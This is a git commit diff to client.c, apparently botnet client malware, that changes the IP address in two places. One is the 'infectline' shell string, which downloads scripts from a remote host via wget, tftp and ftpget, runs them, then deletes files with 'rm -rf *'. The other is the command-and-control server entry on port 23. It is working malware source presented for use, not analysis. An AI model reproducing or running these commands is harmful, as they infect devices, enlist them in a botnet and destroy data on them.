5c97621bea870cc5b191f87e91f0f8800cabf7a1
minedevelopes <rivan726@gmail.com>
2017-12-27 08:39:44 +0000

    Update client.c

--- client.c
+++ client.c
@@ -32,13 +32,13 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 
-char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 35.226.89.45/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 35.226.89.45 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 35.226.89.45; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 35.226.89.45 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n";
+char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 35.227.127.210/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 35.227.127.210 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 35.227.127.210; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 35.227.127.210 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n";
 
 // WGET LINE GOES HERE ^
 
 unsigned char *commServer[] =
 {
-        "35.226.89.45:23"
+        "35.227.127.210:23"
 };
 
 int initConnection();
